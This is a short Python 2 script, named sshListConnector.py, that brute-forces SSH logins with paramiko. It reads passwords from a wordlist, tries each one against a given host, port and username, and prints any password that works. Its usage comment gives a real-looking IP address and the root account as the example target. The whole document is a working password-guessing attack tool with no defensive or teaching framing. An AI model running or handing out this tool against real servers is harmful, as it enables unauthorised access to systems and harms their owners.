import paramiko
import time
import sys

#Example usage: 
#python sshListConnector.py 149.56.111.22 22 root 10k

hostname = sys.argv[1]
port = int(sys.argv[2])
uid = sys.argv[3]
wordlist = sys.argv[4]

print '\n===== SSH AUTHENTICATOR ====='
print '----- HOST: ' + hostname
print '----- PORT: ', port
print '----- UID: ' + uid
print '----- WORDLIST: ' + wordlist + '\n'

with open(wordlist) as f:
	counter = 0

	for line in f:
		psw = line.strip()

		try:
			client = paramiko.Transport((hostname, port))
			client.connect(username=uid, password=psw)
			client.close()

			print "\n===== FOUND ====="
			print "uid: ", uid
			print "pass: ", psw
			break

		except Exception, e:
			print "Couldn't do it: %s" % e
			client.close()
			counter += 1
			print counter, "-", line.strip()
			
			